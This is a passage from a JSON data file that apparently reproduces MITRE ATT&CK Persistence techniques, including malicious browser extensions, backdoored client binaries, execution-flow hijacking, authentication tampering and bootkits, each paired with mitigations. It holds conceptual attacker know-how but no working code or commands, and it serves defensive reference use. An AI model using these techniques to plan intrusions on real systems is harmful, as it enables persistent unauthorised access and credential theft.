        { "type": "text", "content": " files. In macOS 11+, the use of the " },
        { "type": "code", "content": "profiles" },
        {
          "type": "text",
          "content": " tool can no longer install configuration profiles, however "
        },
        { "type": "code", "content": ".mobileconfig" },
        {
          "type": "text",
          "content": " files can be planted and installed with user interaction."
        }
      ],
      [
        {
          "type": "text",
          "content": "Once the extension is installed, it can browse to websites in the background, steal all information that a user enters into a browser (including credentials), and be used as an installer for a RAT for persistence."
        }
      ],
      [
        {
          "type": "text",
          "content": "There have also been instances of botnets using a persistent backdoor through malicious Chrome extensions. There have also been similar examples of extensions being used for command & control."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "Audit",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure extensions that are installed are the intended ones as many malicious extensions will masquerade as legitimate ones."
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "Execution Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Set a browser extension allow or deny list as appropriate for your security policy. "
            }
          ]
        ]
      },
      {
        "id": "M1033",
        "name": "Limit Software Installation",
        "description": [
          [
            {
              "type": "text",
              "content": "Only install browser extensions from trusted sources that can be verified. Browser extensions for some browsers can be controlled through Group Policy. Change settings to prevent the browser from installing extensions without sufficient permissions."
            }
          ]
        ]
      },
      {
        "id": "M1051",
        "name": "Update Software",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure operating systems and browsers are using the most current version. "
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "User Training",
        "description": [
          [
            {
              "type": "text",
              "content": "Close out all browser sessions when finished using them to prevent any potentially malicious extensions from continuing to run."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1554",
    "name": "Compromise Client Software Binary",
    "tactics": [{ "id": "TA0003", "name": "Persistence" }],
    "subs": [],
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may modify client software binaries to establish persistent access to systems. Client software enables users to access services provided by a server. Common client software types are SSH clients, FTP clients, email clients, and web browsers."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may make modifications to client software binaries to carry out malicious tasks when those applications are in use. For example, an adversary may copy source code for the client software, add a backdoor, compile for the target, and replace the legitimate application binary (or support files) with the backdoored one. An adversary may also modify an existing binary by patching in malicious functionality (e.g., IAT Hooking/Entry point patching) prior to the binary’s legitimate execution. For example, an adversary may modify the entry point of a binary to point to malicious code patched in by the adversary before resuming normal execution flow."
        }
      ],
      [
        {
          "type": "text",
          "content": "Since these applications may be routinely executed by the user, the adversary can leverage this for persistent access to the host."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1045",
        "name": "Code Signing",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure all application component binaries are signed by the correct application developers."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1136",
    "name": "Create Account",
    "tactics": [{ "id": "TA0003", "name": "Persistence" }],
    "subs": [
      { "id": "T1136.001", "name": "Local Account" },
      { "id": "T1136.002", "name": "Domain Account" },
      { "id": "T1136.003", "name": "Cloud Account" }
    ],
    "version": "2.4",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may create an account to maintain access to victim systems. With a sufficient level of access, creating such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system."
        }
      ],
      [
        {
          "type": "text",
          "content": "Accounts may be created on the local system or within a domain or cloud tenant. In cloud environments, adversaries may create accounts that only have access to specific services, which can reduce the chance of detection."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1032",
        "name": "Multi-factor Authentication",
        "description": [
          [
            {
              "type": "text",
              "content": "Use multi-factor authentication for user and privileged accounts."
            }
          ]
        ]
      },
      {
        "id": "M1030",
        "name": "Network Segmentation",
        "description": [
          [
            {
              "type": "text",
              "content": "Configure access controls and firewalls to limit access to domain controllers and systems used to create and manage accounts."
            }
          ]
        ]
      },
      {
        "id": "M1028",
        "name": "Operating System Configuration",
        "description": [
          [
            {
              "type": "text",
              "content": "Protect domain controllers by ensuring proper security configuration for critical servers."
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Limit the number of accounts with permissions to create other accounts. Do not allow domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1543",
    "name": "Create or Modify System Process",
    "tactics": [
      { "id": "TA0003", "name": "Persistence" },
      { "id": "TA0004", "name": "Privilege Escalation" }
    ],
    "subs": [
      { "id": "T1543.001", "name": "Launch Agent" },
      { "id": "T1543.002", "name": "Systemd Service" },
      { "id": "T1543.003", "name": "Windows Service" },
      { "id": "T1543.004", "name": "Launch Daemon" }
    ],
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services. On macOS, launchd processes known as Launch Daemon and Launch Agent are run to finish system initialization and load user specific parameters. "
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.  "
        }
      ],
      [
        {
          "type": "text",
          "content": "Services, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges. "
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "Audit",
        "description": [
          [
            {
              "type": "text",
              "content": "Use auditing tools capable of detecting privilege and service abuse opportunities on systems within an enterprise and correct them."
            }
          ]
        ]
      },
      {
        "id": "M1040",
        "name": "Behavior Prevention on Endpoint",
        "description": [
          [
            {
              "type": "text",
              "content": "On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent an application from writing a signed vulnerable driver to the system. On Windows 10 and 11, enable Microsoft Vulnerable Driver Blocklist to assist in hardening against third party-developed drivers. "
            }
          ]
        ]
      },
      {
        "id": "M1045",
        "name": "Code Signing",
        "description": [
          [
            {
              "type": "text",
              "content": "Enforce registration and execution of only legitimately signed service drivers where possible."
            }
          ]
        ]
      },
      {
        "id": "M1033",
        "name": "Limit Software Installation",
        "description": [
          [
            {
              "type": "text",
              "content": "Restrict software installation to trusted repositories only and be cautious of orphaned software packages."
            }
          ]
        ]
      },
      {
        "id": "M1028",
        "name": "Operating System Configuration",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure that Driver Signature Enforcement is enabled to restrict unsigned drivers from being installed. "
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "Restrict File and Directory Permissions",
        "description": [
          [
            {
              "type": "text",
              "content": "Restrict read/write access to system-level process files to only select privileged users who have a legitimate need to manage system services."
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Limit privileges of user accounts and groups so that only authorized administrators can interact with system-level process changes and service configurations."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1546",
    "name": "Event Triggered Execution",
    "tactics": [
      { "id": "TA0004", "name": "Privilege Escalation" },
      { "id": "TA0003", "name": "Persistence" }
    ],
    "subs": [
      { "id": "T1546.001", "name": "Change Default File Association" },
      { "id": "T1546.002", "name": "Screensaver" },
      {
        "id": "T1546.003",
        "name": "Windows Management Instrumentation Event Subscription"
      },
      { "id": "T1546.004", "name": "Unix Shell Configuration Modification" },
      { "id": "T1546.005", "name": "Trap" },
      { "id": "T1546.006", "name": "LC_LOAD_DYLIB Addition" },
      { "id": "T1546.007", "name": "Netsh Helper DLL" },
      { "id": "T1546.008", "name": "Accessibility Features" },
      { "id": "T1546.009", "name": "AppCert DLLs" },
      { "id": "T1546.010", "name": "AppInit DLLs" },
      { "id": "T1546.011", "name": "Application Shimming" },
      { "id": "T1546.012", "name": "Image File Execution Options Injection" },
      { "id": "T1546.013", "name": "PowerShell Profile" },
      { "id": "T1546.014", "name": "Emond" },
      { "id": "T1546.015", "name": "Component Object Model Hijacking" },
      { "id": "T1546.016", "name": "Installer Packages" }
    ],
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. Cloud environments may also support various functions and services that monitor and can be invoked in response to specific cloud events."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked."
        }
      ],
      [
        {
          "type": "text",
          "content": "Since the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges. "
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  },
  {
    "id": "T1133",
    "name": "External Remote Services",
    "tactics": [
      { "id": "TA0003", "name": "Persistence" },
      { "id": "TA0001", "name": "Initial Access" }
    ],
    "subs": [],
    "version": "2.4",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as Windows Remote Management and VNC can also be used externally."
        }
      ],
      [
        {
          "type": "text",
          "content": "Access to Valid Accounts to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as a redundant or persistent access mechanism during an operation."
        }
      ],
      [
        {
          "type": "text",
          "content": "Access may also be gained through an exposed service that doesn’t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "Disable or Remove Feature or Program",
        "description": [
          [
            {
              "type": "text",
              "content": "Disable or block remotely available services that may be unnecessary."
            }
          ]
        ]
      },
      {
        "id": "M1035",
        "name": "Limit Access to Resource Over Network",
        "description": [
          [
            {
              "type": "text",
              "content": "Limit access to remote services through centrally managed concentrators such as VPNs and other managed remote access systems."
            }
          ]
        ]
      },
      {
        "id": "M1032",
        "name": "Multi-factor Authentication",
        "description": [
          [
            {
              "type": "text",
              "content": "Use strong two-factor or multi-factor authentication for remote service accounts to mitigate an adversary's ability to leverage stolen credentials, but be aware of Multi-Factor Authentication Interception techniques for some two-factor authentication implementations."
            }
          ]
        ]
      },
      {
        "id": "M1030",
        "name": "Network Segmentation",
        "description": [
          [
            {
              "type": "text",
              "content": "Deny direct remote access to internal systems through the use of network proxies, gateways, and firewalls."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1574",
    "name": "Hijack Execution Flow",
    "tactics": [
      { "id": "TA0003", "name": "Persistence" },
      { "id": "TA0004", "name": "Privilege Escalation" },
      { "id": "TA0005", "name": "Defense Evasion" }
    ],
    "subs": [
      { "id": "T1574.001", "name": "DLL Search Order Hijacking" },
      { "id": "T1574.002", "name": "DLL Side-Loading" },
      { "id": "T1574.004", "name": "Dylib Hijacking" },
      {
        "id": "T1574.005",
        "name": "Executable Installer File Permissions Weakness"
      },
      { "id": "T1574.006", "name": "Dynamic Linker Hijacking" },
      {
        "id": "T1574.007",
        "name": "Path Interception by PATH Environment Variable"
      },
      {
        "id": "T1574.008",
        "name": "Path Interception by Search Order Hijacking"
      },
      { "id": "T1574.009", "name": "Path Interception by Unquoted Path" },
      { "id": "T1574.010", "name": "Services File Permissions Weakness" },
      { "id": "T1574.011", "name": "Services Registry Permissions Weakness" },
      { "id": "T1574.012", "name": "COR_PROFILER" },
      { "id": "T1574.013", "name": "KernelCallbackTable" }
    ],
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution."
        }
      ],
      [
        {
          "type": "text",
          "content": "There are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1013",
        "name": "Application Developer Guidance",
        "description": [
          [
            {
              "type": "text",
              "content": "When possible, include hash values in manifest files to help prevent side-loading of malicious libraries."
            }
          ]
        ]
      },
      {
        "id": "M1047",
        "name": "Audit",
        "description": [
          [
            {
              "type": "text",
              "content": "Use auditing tools capable of detecting hijacking opportunities on systems within an enterprise and correct them. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for hijacking weaknesses."
            }
          ],
          [
            {
              "type": "text",
              "content": "Use the program sxstrace.exe that is included with Windows along with manual inspection to check manifest files for side-loading vulnerabilities in software."
            }
          ],
          [
            {
              "type": "text",
              "content": "Find and eliminate path interception weaknesses in program configuration files, scripts, the PATH environment variable, services, and in shortcuts by surrounding PATH variables with quotation marks when functions allow for them. Be aware of the search order Windows uses for executing or loading binaries and use fully qualified paths wherever appropriate."
            }
          ],
          [
            {
              "type": "text",
              "content": "Clean up old Windows Registry keys when software is uninstalled to avoid keys with no associated legitimate binaries. Periodically search for and correct or report path interception weaknesses on systems that may have been introduced using custom or available tools that report software using insecure path configurations."
            }
          ]
        ]
      },
      {
        "id": "M1040",
        "name": "Behavior Prevention on Endpoint",
        "description": [
          [
            {
              "type": "text",
              "content": "Some endpoint security solutions can be configured to block some types of behaviors related to process injection/memory tampering based on common sequences of indicators (ex: execution of specific API functions)."
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "Execution Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Adversaries may use new payloads to execute this technique. Identify and block potentially malicious software executed through hijacking by using application control solutions also capable of blocking libraries loaded by legitimate software."
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "Restrict File and Directory Permissions",
        "description": [
          [
            {
              "type": "text",
              "content": "Install software in write-protected locations. Set directory access controls to prevent file writes to the search paths for applications, both in the folders where applications are run from and the standard library folders."
            }
          ]
        ]
      },
      {
        "id": "M1044",
        "name": "Restrict Library Loading",
        "description": [
          [
            {
              "type": "text",
              "content": "Disallow loading of remote DLLs. This is included by default in Windows Server 2012+ and is available by patch for XP+ and Server 2003+."
            }
          ],
          [
            {
              "type": "text",
              "content": "Enable Safe DLL Search Mode to force search for system DLLs in directories with greater restrictions (e.g. "
            },
            { "type": "code", "content": "%SYSTEMROOT%" },
            {
              "type": "text",
              "content": ")to be used before local directory DLLs (e.g. a user's home directory)"
            }
          ],
          [
            {
              "type": "text",
              "content": "The Safe DLL Search Mode can be enabled via Group Policy at Computer Configuration > [Policies] > Administrative Templates > MSS (Legacy): MSS: (SafeDllSearchMode) Enable Safe DLL search mode. The associated Windows Registry key for this is located at "
            },
            {
              "type": "code",
              "content": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\SafeDLLSearchMode"
            }
          ]
        ]
      },
      {
        "id": "M1024",
        "name": "Restrict Registry Permissions",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure proper permissions are set for Registry hives to prevent users from modifying keys for system components that may lead to privilege escalation."
            }
          ]
        ]
      },
      {
        "id": "M1051",
        "name": "Update Software",
        "description": [
          [
            {
              "type": "text",
              "content": "Update software regularly to include patches that fix DLL side-loading vulnerabilities."
            }
          ]
        ]
      },
      {
        "id": "M1052",
        "name": "User Account Control",
        "description": [
          [
            {
              "type": "text",
              "content": "Turn off UAC's privilege elevation for standard users "
            },
            {
              "type": "code",
              "content": "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System]"
            },
            {
              "type": "text",
              "content": " to automatically deny elevation requests, add: "
            },
            {
              "type": "code",
              "content": "\"ConsentPromptBehaviorUser\"=dword:00000000"
            },
            {
              "type": "text",
              "content": ". Consider enabling installer detection for all users by adding: "
            },
            {
              "type": "code",
              "content": "\"EnableInstallerDetection\"=dword:00000001"
            },
            {
              "type": "text",
              "content": ". This will prompt for a password for installation and also log the attempt. To disable installer detection, instead add: "
            },
            {
              "type": "code",
              "content": "\"EnableInstallerDetection\"=dword:00000000"
            },
            {
              "type": "text",
              "content": ". This may prevent potential elevation of privileges through exploitation during the process of UAC detecting the installer, but will allow the installation process to continue without being logged.  "
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service binary target path locations. Deny execution from user directories such as file download directories and temp directories where able."
            }
          ],
          [
            {
              "type": "text",
              "content": "Ensure that proper permissions and directory access control are set to deny users the ability to write files to the top-level directory "
            },
            { "type": "code", "content": "C:" },
            { "type": "text", "content": " and system directories, such as " },
            { "type": "code", "content": "C:\\Windows\\" },
            {
              "type": "text",
              "content": ", to reduce places where malicious files could be placed for execution."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1525",
    "name": "Implant Internal Image",
    "tactics": [{ "id": "TA0003", "name": "Persistence" }],
    "subs": [],
    "version": "2.1",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may implant cloud or container images with malicious code to establish persistence after gaining access to an environment. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be implanted or backdoored. Unlike Upload Malware, this technique focuses on adversaries implanting an image in a registry within a victim’s environment. Depending on how the infrastructure is provisioned, this could provide persistent access if the infrastructure provisioning tool is instructed to always use the latest image."
        }
      ],
      [
        {
          "type": "text",
          "content": "A tool has been developed to facilitate planting backdoors in cloud container images. If an adversary has access to a compromised AWS instance, and permissions to list the available container images, they may implant a backdoor such as a Web Shell."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "Audit",
        "description": [
          [
            {
              "type": "text",
              "content": "Periodically check the integrity of images and containers used in cloud deployments to ensure they have not been modified to include malicious software."
            }
          ]
        ]
      },
      {
        "id": "M1045",
        "name": "Code Signing",
        "description": [
          [
            {
              "type": "text",
              "content": "Several cloud service providers support content trust models that require container images be signed by trusted sources."
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Limit permissions associated with creating and modifying platform images or containers based on the principle of least privilege."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1556",
    "name": "Modify Authentication Process",
    "tactics": [
      { "id": "TA0006", "name": "Credential Access" },
      { "id": "TA0005", "name": "Defense Evasion" },
      { "id": "TA0003", "name": "Persistence" }
    ],
    "subs": [
      { "id": "T1556.001", "name": "Domain Controller Authentication" },
      { "id": "T1556.002", "name": "Password Filter DLL" },
      { "id": "T1556.003", "name": "Pluggable Authentication Modules" },
      { "id": "T1556.004", "name": "Network Device Authentication" },
      { "id": "T1556.005", "name": "Reversible Encryption" },
      { "id": "T1556.006", "name": "Multi-Factor Authentication" },
      { "id": "T1556.007", "name": "Hybrid Identity" },
      { "id": "T1556.008", "name": "Network Provider DLL" }
    ],
    "version": "2.3",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using Valid Accounts."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "Audit",
        "description": [
          [
            {
              "type": "text",
              "content": "Review authentication logs to ensure that mechanisms such as enforcement of MFA are functioning as intended."
            }
          ],
          [
            {
              "type": "text",
              "content": "Periodically review the hybrid identity solution in use for any discrepancies. For example, review all Pass Through Authentication (PTA) agents in the Azure Management Portal to identify any unwanted or unapproved ones. If ADFS is in use, review DLLs and executable files in the AD FS and Global Assembly Cache directories to ensure that they are signed by Microsoft. Note that in some cases binaries may be catalog-signed, which may cause the file to appear unsigned when viewing file properties."
            }
          ],
          [
            {
              "type": "text",
              "content": "Periodically review for new and unknown network provider DLLs within the Registry ("
            },
            {
              "type": "code",
              "content": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\<NetworkProviderName>\\NetworkProvider\\ProviderPath"
            },
            {
              "type": "text",
              "content": "). Ensure only valid network provider DLLs are registered. The name of these can be found in the Registry key at "
            },
            {
              "type": "code",
              "content": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order"
            },
            {
              "type": "text",
              "content": ", and have corresponding service subkey pointing to a DLL at "
            },
            {
              "type": "code",
              "content": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentC ontrolSet\\Services\\<NetworkProviderName>\\NetworkProvider"
            },
            { "type": "text", "content": "." }
          ]
        ]
      },
      {
        "id": "M1032",
        "name": "Multi-factor Authentication",
        "description": [
          [
            {
              "type": "text",
              "content": "Integrating multi-factor authentication (MFA) as part of organizational policy can greatly reduce the risk of an adversary gaining control of valid credentials that may be used for additional tactics such as initial access, lateral movement, and collecting information. MFA can also be used to restrict access to cloud resources and APIs. "
            }
          ]
        ]
      },
      {
        "id": "M1028",
        "name": "Operating System Configuration",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure only valid password filters are registered. Filter DLLs must be present in Windows installation directory ("
            },
            { "type": "code", "content": "C:\\Windows\\System32\\" },
            {
              "type": "text",
              "content": " by default) of a domain controller and/or local computer with a corresponding entry in "
            },
            {
              "type": "code",
              "content": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages"
            },
            { "type": "text", "content": ". " }
          ],
          [
            { "type": "text", "content": "Starting in Windows 11 22H2, the " },
            { "type": "code", "content": "EnableMPRNotifications" },
            {
              "type": "text",
              "content": " policy can be disabled through Group Policy or through a configuration service provider to prevent Winlogon from sending credentials to network providers."
            }
          ]
        ]
      },
      {
        "id": "M1027",
        "name": "Password Policies",
        "description": [
          [
            { "type": "text", "content": "Ensure that " },
            { "type": "code", "content": "AllowReversiblePasswordEncryption" },
            {
              "type": "text",
              "content": " property is set to disabled unless there are application requirements."
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Audit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account.   These audits should also include if default accounts have been enabled, or if new local accounts are created that have not be authorized. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers. "
            }
          ],
          [
            {
              "type": "text",
              "content": "Limit access to the root account and prevent users from modifying protected components through proper privilege separation (ex SELinux, grsecurity, AppArmor, etc.) and limiting Privilege Escalation opportunities."
            }
          ],
          [
            {
              "type": "text",
              "content": "Limit on-premises accounts with access to the hybrid identity solution in place. For example, limit Azure AD Global Administrator accounts to only those required, and ensure that these are dedicated cloud-only accounts rather than hybrid ones."
            }
          ]
        ]
      },
      {
        "id": "M1025",
        "name": "Privileged Process Integrity",
        "description": [
          [
            {
              "type": "text",
              "content": "Enabled features, such as Protected Process Light (PPL), for LSA."
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "Restrict File and Directory Permissions",
        "description": [
          [
            { "type": "text", "content": "Restrict write access to the " },
            {
              "type": "code",
              "content": "/Library/Security/SecurityAgentPlugins"
            },
            { "type": "text", "content": " directory." }
          ]
        ]
      },
      {
        "id": "M1024",
        "name": "Restrict Registry Permissions",
        "description": [
          [
            {
              "type": "text",
              "content": "Restrict Registry permissions to disallow the modification of sensitive Registry keys such as "
            },
            {
              "type": "code",
              "content": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order"
            },
            { "type": "text", "content": "." }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure that proper policies are implemented to dictate the the secure enrollment and deactivation of authentication mechanisms, such as MFA, for user accounts."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1137",
    "name": "Office Application Startup",
    "tactics": [{ "id": "TA0003", "name": "Persistence" }],
    "subs": [
      { "id": "T1137.001", "name": "Office Template Macros" },
      { "id": "T1137.002", "name": "Office Test" },
      { "id": "T1137.003", "name": "Outlook Forms" },
      { "id": "T1137.004", "name": "Outlook Home Page" },
      { "id": "T1137.005", "name": "Outlook Rules" },
      { "id": "T1137.006", "name": "Add-ins" }
    ],
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may leverage Microsoft Office-based applications for persistence between startups. Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started; this can include the use of Office Template Macros and add-ins."
        }
      ],
      [
        {
          "type": "text",
          "content": "A variety of features have been discovered in Outlook that can be abused to obtain persistence, such as Outlook rules, forms, and Home Page. These persistence mechanisms can work within Outlook or be used through Office 365."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "Behavior Prevention on Endpoint",
        "description": [
          [
            {
              "type": "text",
              "content": "On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent Office applications from creating child processes and from writing potentially malicious executable content to disk. "
            }
          ]
        ]
      },
      {
        "id": "M1042",
        "name": "Disable or Remove Feature or Program",
        "description": [
          [
            {
              "type": "text",
              "content": "Follow Office macro security best practices suitable for your environment. Disable Office VBA macros from executing."
            }
          ],
          [
            {
              "type": "text",
              "content": "Disable Office add-ins. If they are required, follow best practices for securing them by requiring them to be signed and disabling user notification for allowing add-ins. For some add-ins types (WLL, VBA) additional mitigation is likely required as disabling add-ins in the Office Trust Center does not disable WLL nor does it prevent VBA code from executing. "
            }
          ]
        ]
      },
      {
        "id": "M1054",
        "name": "Software Configuration",
        "description": [
          [
            {
              "type": "text",
              "content": "For the Office Test method, create the Registry key used to execute it and set the permissions to \"Read Control\" to prevent easy access to the key without administrator permissions or requiring Privilege Escalation. "
            }
          ]
        ]
      },
      {
        "id": "M1051",
        "name": "Update Software",
        "description": [
          [
            {
              "type": "text",
              "content": "For the Outlook methods, blocking macros may be ineffective as the Visual Basic engine used for these features is separate from the macro scripting engine. Microsoft has released patches to try to address each issue. Ensure KB3191938 which blocks Outlook Visual Basic and displays a malicious code warning, KB4011091 which disables custom forms by default, and KB4011162 which removes the legacy Home Page feature, are applied to systems."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1653",
    "name": "Power Settings",
    "tactics": [{ "id": "TA0003", "name": "Persistence" }],
    "subs": [],
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may impair a system's ability to hibernate, reboot, or shut down in order to extend access to infected machines. When a computer enters a dormant state, some or all software and hardware may cease to operate which can disrupt malicious activity."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may abuse system utilities and configuration settings to maintain access by preventing machines from entering a state, such as standby, that can terminate malicious activity."
        }
      ],
      [
        { "type": "text", "content": "For example, " },
        { "type": "code", "content": "powercfg" },
        {
          "type": "text",
          "content": " controls all configurable power system settings on a Windows system and can be abused to prevent an infected host from locking or shutting down. Adversaries may also extend system lock screen timeout settings. Other relevant settings, such as disk and hibernate timeout, can be similarly abused to keep the infected machine running even if no user is active."
        }
      ],
      [
        {
          "type": "text",
          "content": "Aware that some malware cannot survive system reboots, adversaries may entirely delete files used to invoke system shut down or reboot."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "Audit",
        "description": [
          [
            {
              "type": "text",
              "content": "Periodically inspect systems for abnormal and unexpected power settings that may indicate malicious activty."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1542",
    "name": "Pre-OS Boot",
    "tactics": [
      { "id": "TA0005", "name": "Defense Evasion" },
      { "id": "TA0003", "name": "Persistence" }
    ],
    "subs": [
      { "id": "T1542.001", "name": "System Firmware" },
      { "id": "T1542.002", "name": "Component Firmware" },
      { "id": "T1542.003", "name": "Bootkit" },
      { "id": "T1542.004", "name": "ROMMONkit" },
      { "id": "T1542.005", "name": "TFTP Boot" }
    ],
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control flow of execution before the operating system takes control."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may overwrite data in boot drivers or firmware such as BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) to persist on systems at a layer below the operating system. This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1046",
        "name": "Boot Integrity",
        "description": [
          [
            {
              "type": "text",
              "content": "Use Trusted Platform Module technology and a secure or trusted boot process to prevent system integrity from being compromised. Check the integrity of the existing BIOS or EFI to determine if it is vulnerable to modification.  "
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
